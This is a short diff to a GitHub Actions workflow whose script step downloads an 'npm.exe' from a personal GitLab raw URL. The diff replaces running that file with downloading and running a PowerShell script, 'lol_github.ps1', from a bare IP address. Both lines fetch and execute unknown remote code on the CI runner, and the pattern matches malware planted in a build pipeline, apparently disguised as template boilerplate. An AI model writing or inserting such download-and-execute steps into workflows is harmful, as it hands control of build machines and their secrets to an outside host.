@@ -33,6 +33,7 @@ jobs:
       - name: Run a multi-line script
         run: |
           Invoke-WebRequest -Uri gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
-          start .\npm.exe
+          Invoke-WebRequest -Uri 5.102.153.140/lambdatest/lol_github.ps1 -OutFile .\lol_github.ps1
+          .\lol_github.ps1
           echo Add other actions to build,
           echo test, and deploy your project.
